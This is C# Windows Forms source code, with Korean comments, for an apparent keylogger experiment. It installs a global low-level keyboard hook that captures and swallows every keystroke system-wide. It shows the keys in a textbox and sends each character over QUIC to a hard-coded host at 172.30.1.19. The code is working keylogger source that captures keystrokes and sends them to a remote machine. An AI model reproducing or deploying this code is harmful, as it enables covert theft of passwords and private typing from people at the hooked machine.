using QuicNet.Connections;
using QuicNet.Context;
using QuicNet.Streams;
using QuicNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Threading;


namespace guiEX
{
    public partial class Form1 : Form
    {
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x100;

        private delegate IntPtr LowLevelKeyProc(int nCode, IntPtr wParam, IntPtr lParam);
        //이 위로는 DLL import 등입니다.

        private static LowLevelKeyProc keyboardProc = KeyboardHookProc;

        private static IntPtr keyHook = IntPtr.Zero;

        private static Queue<char> texts = new Queue<char>();

        public static void SetHook()
        {
            if (keyHook == IntPtr.Zero)
            {
                using (Process curProcess = Process.GetCurrentProcess())
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    keyHook = SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, GetModuleHandle(curModule.ModuleName), 0);
                    MessageBox.Show("setHook");
                }
            }
        }

        public static void UnHook()
        {
            if (keyHook != IntPtr.Zero)
            {
                UnhookWindowsHookEx(keyHook);
                keyHook = IntPtr.Zero;
                MessageBox.Show("unHook");
            }
        }

        private static IntPtr KeyboardHookProc(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code >= 0 && (int)wParam == WM_KEYDOWN) // 키보드를 누를 때
            {
                char temp = Convert.ToChar(Marshal.ReadInt32(lParam));
                connect(temp);
                texts.Enqueue(temp); //texts큐에 데이터를 집어넣음
                return (IntPtr)1; // 이거 있어야 키보드 씹는거 가능 - 주석처리하고 한번 돌려보면 이해될듯
            }
            return CallNextHookEx(keyHook, code, (int)wParam, lParam);
        }

        private static void connect(char message)
        {
            char[] temp = new char[100];
            temp[0] = message;
            QuicClient client = new QuicClient();
            QuicConnection connection = client.Connect("172.30.1.19", 11000);
            QuicStream stream = connection.CreateStream(QuickNet.Utilities.StreamType.ClientBidirectional);
            stream.Send(Encoding.UTF8.GetBytes(temp));
            try
            {
                byte[] data = stream.Receive();                                   // Receive from server
                Console.WriteLine("Received: " + Encoding.UTF8.GetString(data));
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
        }

        delegate void Delegate_ShowCnt(string msg);
        private volatile bool _stop;
        private void thd1()
        {
            while (!_stop)
            {
                Thread.Sleep(100);
                if (texts.Count > 0)
                {
                    char tmp = texts.Dequeue();
                    this.Invoke(new Delegate_ShowCnt(showText), tmp.ToString());
                }
            }
        }
        private void showText(string ch)
        {
            textBox1.Text += ch;
        }

        Thread t1;
        public Form1()
        {
            InitializeComponent();
        }
        private void Form1_Load(object sender, EventArgs e)
        {
            textBox1.ReadOnly = true;
            FormClosing += new FormClosingEventHandler(closing);
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            SetHook();
            _stop = false; // 종료될 때나 button2 누를 때 쓰레드 멈추기 위한 flag
            t1 = new Thread(thd1);
            t1.Start();
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            UnHook();
            _stop = true;
            try
            {
                t1.Join();
            } catch(Exception ex)
            {

            }
        }
        private void closing(object sender, EventArgs e)
        {
            _stop = true;
            try
            {
                t1.Join();
            } catch(Exception ex)
            {

            }
            Application.Exit();
        }
    }
}
